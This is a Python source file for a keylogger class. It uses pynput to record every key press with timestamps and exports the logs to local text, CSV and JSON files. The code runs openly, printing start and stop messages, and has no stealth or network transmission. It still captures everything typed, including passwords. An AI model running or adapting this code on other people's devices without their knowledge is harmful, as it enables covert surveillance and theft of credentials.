import time
import csv
import json
import os
from datetime import datetime
from pynput import keyboard
from typing import List, Dict

class KeyLoggerService:
    def __init__(self):
        self.logs: List[Dict] = []
        self.is_running: bool = False
        self.listener = None
        self.start_time = None
        self._ensure_log_directory()

    def _ensure_log_directory(self):
        if not os.path.exists("logs"):
            os.makedirs("logs")

    def _get_timestamp(self) -> str:
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def _on_press(self, key):
        try:
            key_data = key.char
        except AttributeError:
            key_data = str(key).replace('Key.', '')

        log_entry = {"event": "press", "key": key_data,"timestamp": self._get_timestamp()}
        self.logs.append(log_entry)

    def start_logging(self):
        if not self.is_running:
            self.is_running = True
            self.start_time = self._get_timestamp()
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            print(f"Service started at {self.start_time}")

    def stop_logging(self):
        if self.is_running and self.listener:
            self.listener.stop()
            self.is_running = False
            print(f"Service stopped. Total events captured: {len(self.logs)}")

    def clear_logs(self):
        self.logs = []
        print("Memory cleared.")

    def export_to_txt(self):
        filename = f"logs/log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Session Started: {self.start_time}\n")
                f.write("-" * 30 + "\n")
                for entry in self.logs:
                    f.write(f"[{entry['timestamp']}] Pressed: {entry['key']}\n")
            return f"Saved to {filename}"
        except Exception as e:
            return f"Error: {e}"

    def export_to_csv(self):
        filename = f"logs/log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        try:
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "Event", "Key"])
                for entry in self.logs:
                    writer.writerow([entry['timestamp'], entry['event'], entry['key']])
            return f"Saved to {filename}"
        except Exception as e:
            return f"Error: {e}"

    def export_to_json(self):
        filename = f"logs/log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.logs, f, indent=4)
            return f"Saved to {filename}"
        except Exception as e:
            return f"Error: {e}"
